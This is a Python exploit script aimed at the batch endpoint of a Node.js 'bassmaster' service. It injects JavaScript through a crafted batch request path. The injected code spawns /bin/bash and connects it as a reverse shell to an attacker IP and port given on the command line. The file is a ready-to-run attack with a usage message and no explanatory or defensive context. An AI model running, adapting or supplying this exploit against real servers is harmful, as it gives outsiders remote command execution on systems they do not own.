#!/usr/bin/python

import requests,sys

def inject(ip, attackerip, attackerport):
    """
    This is the inject function.  It will inject a cmd to bassmaster.

    :param ip: The IP address of the target
    :type ip: string
    :param cmd: Command we want to inject
    :type cmd: string
    """

    target = "http://%s:8080/batch" % sys.argv[1]
    #cmd = "//bin//bash"
    cmd = "\\\\x2fbin\\\\x2fbash"

    #shell = "var net = require(\"net\"),sh = require(\"child_process\").exec(\"%s\"); " % cmd
    #shell += "var client = new net.Socket();"
    #shell += "client.connect(%s, \"%s\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);" % (attackerport, attackerip)
    #shell += "sh.stderr.pipe(client);});"

    shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % cmd
    shell += 'var client = new net.Socket(); '
    shell += 'client.connect(%s, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip)
    shell += 'sh.stderr.pipe(client);});'
    
    request_1 = '{"method":"get","path":"/profile"}' 
    request_2 = '{"method":"get","path":"/item"}' 
    #request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % (shell)
    #request_3 = '{"method":"get","path":"/item/$1.id"}'
    request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell

    
    json = '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3) 
    r = requests.post(target, json)
    
    print(r.text)

def main():
    """
    This is the main function
    """
    if len(sys.argv) != 4:
        #print "(+) usage: %s <target>" % sys.argv[0] 
        print('len of sys.argv: %d' % len(sys.argv))
        print("(+) usage: %s <target> <attackerip> <attackerport>" % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    attackerip = sys.argv[2]
    attackerport = sys.argv[3]

    inject(ip, attackerip, attackerport)



if __name__ == "__main__":
    main()
